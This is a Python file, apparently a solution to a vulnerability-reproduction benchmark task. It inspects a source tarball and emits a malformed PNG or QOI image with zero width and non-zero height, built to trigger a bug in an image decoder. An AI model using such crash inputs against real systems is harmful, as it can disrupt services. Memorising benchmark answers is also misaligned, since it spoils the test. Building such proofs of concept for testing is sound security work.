import tarfile
import binascii
import zlib
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)
        if fmt == "qoi":
            return self._make_qoi_poc()
        else:
            return self._make_png_poc()

    def _detect_format(self, src_path: str) -> str:
        """
        Very lightweight heuristic: if the project appears to use QOI exclusively,
        emit a QOI file; otherwise, default to PNG.
        """
        is_qoi = False
        is_png = False
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if not name_lower.endswith(
                        (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx", ".txt", ".md")
                    ):
                        continue
                    f = tar.extractfile(member)
                    if not f:
                        continue
                    try:
                        data = f.read(4096)
                    finally:
                        f.close()

                    if not is_qoi and (b"qoi.h" in data or b"qoif" in data or b"QOI_" in data):
                        is_qoi = True
                    if not is_png and (
                        b"png.h" in data
                        or b"libpng" in data
                        or b"IHDR" in data
                        or b"spng" in data
                        or b"lodepng" in data
                    ):
                        is_png = True

                    # Early exit if we have strong PNG evidence
                    if is_png:
                        break
        except tarfile.TarError:
            # If anything goes wrong, just fall back to PNG
            return "png"

        if is_qoi and not is_png:
            return "qoi"
        return "png"

    def _build_png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = len(data)
        crc = binascii.crc32(chunk_type + data) & 0xFFFFFFFF
        return struct.pack(">I", length) + chunk_type + data + struct.pack(">I", crc)

    def _make_png_poc(self) -> bytes:
        """
        Construct a minimal PNG with zero width and non-zero height.
        """
        signature = b"\x89PNG\r\n\x1a\n"

        width = 0
        height = 2  # non-zero height with zero width
        bit_depth = 8
        color_type = 2  # truecolor RGB
        compression = 0
        filter_method = 0
        interlace = 0

        ihdr_data = struct.pack(
            ">IIBBBBB",
            width,
            height,
            bit_depth,
            color_type,
            compression,
            filter_method,
            interlace,
        )
        ihdr_chunk = self._build_png_chunk(b"IHDR", ihdr_data)

        # For width=0, each scanline degenerates to just the filter byte.
        # height=2 -> two scanlines -> two filter bytes.
        raw_scanlines = b"\x00\x00"
        compressed = zlib.compress(raw_scanlines)
        idat_chunk = self._build_png_chunk(b"IDAT", compressed)

        iend_chunk = self._build_png_chunk(b"IEND", b"")

        return signature + ihdr_chunk + idat_chunk + iend_chunk

    def _make_qoi_poc(self) -> bytes:
        """
        Construct a minimal QOI file with zero width and non-zero height.
        """
        magic = b"qoif"
        width = 0
        height = 1  # non-zero height
        channels = 3  # RGB
        colorspace = 0  # sRGB with linear alpha or similar

        header = magic + struct.pack(">II", width, height) + bytes([channels, colorspace])

        # QOI end marker: 7x 0x00 + 0x01
        end_marker = b"\x00\x00\x00\x00\x00\x00\x00\x01"

        return header + end_marker